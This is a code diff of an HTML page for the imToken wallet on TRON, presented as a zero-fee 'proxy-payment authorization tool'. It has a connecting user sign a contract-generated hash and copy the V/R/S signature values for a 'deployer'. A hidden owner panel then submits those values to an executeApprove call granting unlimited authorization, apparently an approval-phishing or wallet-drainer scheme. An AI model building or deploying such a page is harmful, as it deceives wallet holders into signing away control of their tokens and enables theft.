@@ -3,393 +3,189 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>固定哈希签名工具（imToken专属修复版）</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <title>简化版代付授权工具</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            padding: 15px 12px; 
-            max-width: 600px; 
-            margin: 0 auto; 
-            background: #121a17; 
-            color: #e0e8e4; 
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+            font-family: Roboto, sans-serif;
+            padding: 20px; max-width: 500px; margin: 0 auto; 
+            background: #121a17; color: #e0e8e4;
         }
-        .header {
-            text-align: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #334155;
+        .card { 
+            background: #1e2925; padding: 18px; border-radius: 8px; 
+            border: 1px solid #334155; margin-bottom: 15px;
         }
-        .header h1 { 
-            font-size: 22px; 
-            color: #3b82f6; 
-            margin-bottom: 8px;
+        .card-title { color: #3b82f6; font-size: 16px; margin-bottom: 12px; }
+        .info-item { margin: 10px 0; font-size: 14px; }
+        .info-item strong { color: #3b82f6; display: inline-block; width: 80px; }
+        .hash-display { 
+            background: #121a17; padding: 10px; border-radius: 6px;
+            font-family: monospace; font-size: 13px; word-break: break-all;
+            color: #4ade80; margin: 10px 0;
         }
-        .header .desc {
-            font-size: 13px; 
-            color: #a0a8a4;
-            line-height: 1.4;
-        }
-        .card {
-            background: #1e2925;
-            padding: 18px;
-            border-radius: 8px;
-            border: 1px solid #334155;
-        }
-        .card-title {
-            font-size: 15px;
-            color: #3b82f6;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .hash-display {
-            background: #121a17;
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid #3b82f6;
-            margin: 10px 0;
-            font-family: monospace;
-            font-size: 13px;
-            word-break: break-all;
-            color: #4ade80;
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            font-size: 15px;
-            border: none;
-            border-radius: 8px;
-            background: #2563eb;
-            color: white;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: background 0.3s;
+        .btn { 
+            width: 100%; padding: 14px; background: #2563eb; color: white;
+            border: none; border-radius: 8px; font-size: 15px; cursor: pointer;
             margin-top: 10px;
         }
-        .btn:hover {
-            background: #3b82f6;
-        }
-        .btn:disabled {
-            background: #294b75;
-            color: #a0a8a4;
-            cursor: not-allowed;
-        }
-        .result-section {
-            margin-top: 10px;
-        }
-        .result-item {
-            margin: 12px 0;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .result-item strong {
-            color: #3b82f6;
-            display: inline-block;
-            width: 60px;
-        }
-        .result-value {
-            color: #e0e8e4;
-            word-break: break-all;
-            font-family: monospace;
-        }
-        .toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 20px;
-            border-radius: 8px;
-            background: #1e2925;
-            border: 1px solid #3b82f6;
-            color: #e0e8e4;
-            font-size: 14px;
-            z-index: 999;
-            display: none;
-        }
-        .warning {
-            background: rgba(249, 115, 22, 0.1);
-            color: #f97316;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            border-left: 3px solid #f97316;
-            margin: 10px 0;
-        }
-        .error-card {
-            background: rgba(239, 68, 68, 0.1);
-            color: #f87171;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            border-left: 3px solid #ef4444;
-            margin: 10px 0;
-        }
-        #userInfo {
-            text-align: center;
-            font-size: 14px;
-            padding: 15px;
-            background: #1e2925;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            line-height: 1.6;
-        }
-        #userInfo span {
-            color: #3b82f6;
-            font-weight: 500;
-        }
-        .env-status {
-            font-size: 13px;
-            color: #a0a8a4;
-            margin-top: 8px;
-            text-align: center;
-        }
-        .env-status.success {
-            color: #4ade80;
-        }
-        .env-status.error {
-            color: #f87171;
+        .btn:disabled { background: #294b75; cursor: not-allowed; }
+        .btn-owner { background: #8b5cf6; }
+        .toast { 
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            padding: 12px 20px; background: #1e2925; border: 1px solid #3b82f6;
+            color: #e0e8e4; border-radius: 6px; display: none; z-index: 999;
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>固定哈希签名工具（修复版）</h1>
-        <p class="desc">解决imToken环境检测失败，直接签名获取V/R/S</p>
-    </div>
-
-    <div id="userInfo">
-        未连接钱包<br>
-        <span>请用imToken内置浏览器打开并连接</span>
+    <div class="card">
+        <div class="card-title">授权者操作（零费用）</div>
+        <div class="info-item"><strong>钱包地址：</strong><span id="userAddr">未连接</span></div>
+        <div class="info-item"><strong>授权金额：</strong>无限（固定）</div>
+        <div class="info-item"><strong>合约哈希：</strong></div>
+        <div class="hash-display" id="contractHash">未生成</div>
     </div>
 
     <div class="card">
-        <div class="card-title">
-            <<i class="fa fa-hashtag"></</i> 待签名哈希（固定）
-        </div>
-        <div class="warning">
-            ⚠️ 已固定哈希值：0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47
-        </div>
-        <div class="hash-display" id="fixedHash">0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47</div>
+        <div class="card-title">签名结果（复制给部署者）</div>
+        <div class="info-item"><strong>V值：</strong><span id="vValue">--</span></div>
+        <div class="info-item"><strong>R值：</strong><span id="rValue">--</span></div>
+        <div class="info-item"><strong>S值：</strong><span id="sValue">--</span></div>
     </div>
 
-    <div class="card">
-        <div class="card-title">
-            <<i class="fa fa-desktop"></</i> 环境检测状态
-        </div>
-        <div id="envStatus" class="env-status error">
-            正在检测imToken环境...
-        </div>
-        <div class="error-card" id="errorTips" style="display: none;">
-            ❌ 检测失败！请按以下步骤操作：<br>
-            1. 关闭当前页面，打开imToken<br>
-            2. 进入「浏览」→ 手动输入网页链接<br>
-            3. 若仍失败：imToken→我的→权限管理→本DApp→允许所有权限
-        </div>
+    <div class="card" style="display: none;" id="ownerCard">
+        <div class="card-title">部署者操作</div>
+        <div class="info-item"><strong>授权者地址：</strong><input type="text" id="ownerUser" placeholder="输入授权者地址" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
+        <div class="info-item"><strong>V值：</strong><input type="text" id="ownerV" placeholder="输入V值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
+        <div class="info-item"><strong>R值：</strong><input type="text" id="ownerR" placeholder="输入R值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
+        <div class="info-item"><strong>S值：</strong><input type="text" id="ownerS" placeholder="输入S值" style="width: 200px; padding: 6px; background: #121a17; color: #e0e8e4; border: 1px solid #334155; border-radius: 4px;"></div>
+        <button id="executeBtn" class="btn btn-owner">执行无限授权</button>
     </div>
 
-    <div class="card result-section">
-        <div class="card-title">
-            <<i class="fa fa-keys"></</i> 签名结果（V/R/S）
-        </div>
-        <div class="result-item">
-            <strong>V值：</strong>
-            <span class="result-value" id="vValue">未签名</span>
-        </div>
-        <div class="result-item">
-            <strong>R值：</strong>
-            <span class="result-value" id="rValue">未签名</span>
-        </div>
-        <div class="result-item">
-            <strong>S值：</strong>
-            <span class="result-value" id="sValue">未签名</span>
-        </div>
-    </div>
-
-    <div style="display: flex; flex-direction: column; gap: 10px;">
-        <button id="connectBtn" class="btn">
-            <<i class="fa fa-link"></</i> 连接imToken钱包
-        </button>
-        <button id="signBtn" class="btn" disabled>
-            <<i class="fa fa-pencil-square-o"></</i> 生成签名（获取VRS）
-        </button>
-        <button id="copyBtn" class="btn" style="background: #8b5cf6;" disabled>
-            <<i class="fa fa-copy"></</i> 复制VRS参数
-        </button>
-    </div>
+    <button id="connectBtn" class="btn">连接imToken钱包</button>
+    <button id="genHashBtn" class="btn" disabled>生成合约哈希</button>
+    <button id="signBtn" class="btn" disabled>签名哈希（零费用）</button>
+    <button id="copyBtn" class="btn" disabled>复制V/R/S</button>
 
     <div class="toast" id="toast"></div>
 
     <script>
-        // 核心配置
-        const FIXED_HASH = "0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47";
-        let tronWeb, userAddress;
-        const ENV_CHECK_INTERVAL = 1000; // 环境检测轮询间隔
-        const MAX_CHECK_TIMES = 5; // 最大检测次数
-        let checkTimes = 0;
+        // 配置：替换为你的合约信息
+        const CONFIG = {
+            CONTRACT_ADDR: "THeU99vLEAS7Jym97cb1s3TnwQi6doTeX9",
+            USDT_ADDR: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf" // TRON主网USDT
+        };
+
+        let tronWeb, userAddress, contract;
+        let messageHash = "";
 
         window.onload = () => {
-            // 绑定DOM元素
             const connectBtn = document.getElementById("connectBtn");
+            const genHashBtn = document.getElementById("genHashBtn");
             const signBtn = document.getElementById("signBtn");
             const copyBtn = document.getElementById("copyBtn");
-            const userInfoEl = document.getElementById("userInfo");
-            const envStatusEl = document.getElementById("envStatus");
-            const errorTipsEl = document.getElementById("errorTips");
+            const executeBtn = document.getElementById("executeBtn");
 
-            // 优先检测imToken环境（轮询确保捕捉到tronWeb注入）
-            startEnvCheck();
+            // 初始化合约
+            if (window.tronWeb) {
+                tronWeb = window.tronWeb;
+                contract = tronWeb.contract().at(CONFIG.CONTRACT_ADDR);
+            }
 
-            // 连接钱包（兼容imToken所有版本）
+            // 连接钱包
             connectBtn.onclick = async () => {
                 try {
-                    if (!window.tronWeb) {
-                        // 强制唤起imToken内置浏览器
-                        window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
-                        setTimeout(() => {
-                            showToast("请在imToken中打开该链接", "error");
-                        }, 1000);
-                        return;
-                    }
-
-                    // 兼容旧版imToken：直接获取地址
-                    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                        userAddress = tronWeb.defaultAddress.base58.trim();
-                        await initWallet();
-                        return;
-                    }
-
-                    // 新版imToken：请求授权
                     const accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-                    if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
-                    userAddress = accounts[0].trim();
-                    await initWallet();
+                    userAddress = accounts[0];
+                    document.getElementById("userAddr").textContent = userAddress.slice(0,8)+"..."+userAddress.slice(-6);
+                    // 检测是否为部署者
+                    if (userAddress === "你的部署者地址") {
+                        document.getElementById("ownerCard").style.display = "block";
+                    }
+                    connectBtn.disabled = true;
+                    genHashBtn.disabled = false;
+                    showToast("钱包连接成功");
                 } catch (e) {
-                    showToast(`连接失败：${e.message}`, "error");
-                    console.error("连接错误：", e);
+                    showToast(`连接失败：${e.message}`);
                 }
             };
 
-            // 生成签名（核心修复：简化签名逻辑，确保imToken识别）
+            // 生成哈希（固定无限授权）
+            genHashBtn.onclick = async () => {
+                try {
+                    messageHash = await contract.generateHash(userAddress).call();
+                    document.getElementById("contractHash").textContent = messageHash;
+                    genHashBtn.disabled = true;
+                    signBtn.disabled = false;
+                    showToast("哈希生成成功");
+                } catch (e) {
+                    showToast(`生成失败：${e.message}`);
+                }
+            };
+
+            // 签名哈希（imToken零费用）
             signBtn.onclick = async () => {
                 try {
-                    signBtn.disabled = true;
-                    signBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 签名中...';
-
-                    // 直接使用固定哈希签名（跳过前缀处理，imToken会自动兼容EIP-191）
-                    let signature = await tronWeb.trx.sign(FIXED_HASH);
-                    signature = signature.signature || signature; // 兼容不同返回格式
-                    if (!signature) throw new Error("钱包未返回签名，请重试");
-
-                    // 解析V/R/S（容错处理）
-                    signature = signature.replace(/^0x/, "");
-                    if (signature.length !== 130) throw new Error(`签名长度错误（实际${signature.length}位，需130位）`);
+                    const prefix = "\x19Ethereum Signed Message:\n32";
+                    const prefixHex = asciiToHex(prefix);
+                    const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
+                    const signature = await tronWeb.trx.sign(signedHash);
                     
-                    const r = "0x" + signature.slice(0, 64);
-                    const s = "0x" + signature.slice(64, 128);
-                    let v = parseInt(signature.slice(128, 130), 16);
+                    // 解析V/R/S
+                    const sig = signature.replace(/^0x/, "");
+                    const v = parseInt(sig.slice(128,130), 16) + 27;
+                    const r = "0x" + sig.slice(0,64);
+                    const s = "0x" + sig.slice(64,128);
 
-                    // V值强制修正（确保合约兼容）
-                    v = v >= 27 ? v : v + 27;
-                    if (v !== 27 && v !== 28) throw new Error(`V值无效（${v}），需为27或28`);
-
-                    // 显示结果
                     document.getElementById("vValue").textContent = v;
                     document.getElementById("rValue").textContent = r;
                     document.getElementById("sValue").textContent = s;
+                    signBtn.disabled = true;
                     copyBtn.disabled = false;
-                    showToast("签名成功！已获取V/R/S", "success");
+                    showToast("签名成功");
                 } catch (e) {
-                    showToast(`签名失败：${e.message}`, "error");
-                    console.error("签名错误：", e);
-                } finally {
-                    signBtn.disabled = false;
-                    signBtn.innerHTML = '<<i class="fa fa-pencil-square-o"></</i> 生成签名（获取VRS）';
+                    showToast(`签名失败：${e.message}`);
                 }
             };
 
-            // 复制VRS
+            // 复制V/R/S
             copyBtn.onclick = () => {
-                const v = document.getElementById("vValue").textContent;
-                const r = document.getElementById("rValue").textContent;
-                const s = document.getElementById("sValue").textContent;
-                const content = `V: ${v}\nR: ${r}\nS: ${s}`;
-                
-                navigator.clipboard.writeText(content).then(() => {
-                    showToast("VRS已复制到剪贴板", "success");
-                }).catch(err => {
-                    // 降级方案：手动选中
-                    const textarea = document.createElement("textarea");
-                    textarea.value = content;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand("copy");
-                    document.body.removeChild(textarea);
-                    showToast("已手动复制（兼容旧版浏览器）", "success");
-                });
+                const content = `用户地址：${userAddress}\nV: ${document.getElementById("vValue").textContent}\nR: ${document.getElementById("rValue").textContent}\nS: ${document.getElementById("sValue").textContent}`;
+                navigator.clipboard.writeText(content);
+                showToast("已复制V/R/S");
             };
 
-            // 环境检测函数
-            function startEnvCheck() {
-                const checkTimer = setInterval(() => {
-                    checkTimes++;
-                    if (window.tronWeb) {
-                        tronWeb = window.tronWeb;
-                        envStatusEl.textContent = "✅ 已检测到imToken环境";
-                        envStatusEl.className = "env-status success";
-                        errorTipsEl.style.display = "none";
-                        clearInterval(checkTimer);
-                        // 自动尝试连接钱包
-                        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
-                            userAddress = tronWeb.defaultAddress.base58.trim();
-                            initWallet();
-                        }
-                    } else if (checkTimes >= MAX_CHECK_TIMES) {
-                        envStatusEl.textContent = "❌ 未检测到imToken环境";
-                        envStatusEl.className = "env-status error";
-                        errorTipsEl.style.display = "block";
-                        clearInterval(checkTimer);
-                    } else {
-                        envStatusEl.textContent = `⌛ 检测中（${checkTimes}/${MAX_CHECK_TIMES}）...`;
-                    }
-                }, ENV_CHECK_INTERVAL);
-            }
-
-            // 初始化钱包信息
-            async function initWallet() {
+            // 部署者执行授权
+            executeBtn.onclick = async () => {
                 try {
-                    const trxBalance = (Number(await tronWeb.trx.getBalance(userAddress)) / 10**6).toFixed(2);
-                    userInfoEl.innerHTML = `
-                        已连接：<br>
-                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                        TRX余额：<span>${trxBalance}</span>
-                    `;
-                    connectBtn.style.display = "none";
-                    signBtn.disabled = false;
-                    showToast("钱包连接成功！", "success");
+                    const user = document.getElementById("ownerUser").value;
+                    const v = parseInt(document.getElementById("ownerV").value);
+                    const r = document.getElementById("ownerR").value;
+                    const s = document.getElementById("ownerS").value;
+                    
+                    const result = await contract.executeApprove(user, v, r, s).send({ feeLimit: 100000000 });
+                    if (result.result) showToast("授权执行成功");
                 } catch (e) {
-                    showToast(`钱包初始化失败：${e.message}`, "error");
-                    console.error("初始化错误：", e);
+                    showToast(`执行失败：${e.message}`);
                 }
-            }
-
-            // 提示弹窗
-            function showToast(msg, type = "success") {
-                const toast = document.getElementById("toast");
-                toast.textContent = msg;
-                toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
-                toast.style.display = "block";
-                setTimeout(() => toast.style.display = "none", 3000);
-            }
+            };
         };
+
+        // 辅助函数
+        function asciiToHex(str) {
+            let hex = "";
+            for (let i = 0; i < str.length; i++) {
+                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
+            }
+            return hex;
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById("toast");
+            toast.textContent = msg;
+            toast.style.display = "block";
+            setTimeout(() => toast.style.display = "none", 3000);
+        }
     </script>
 </body>
-</html>
+</html>         
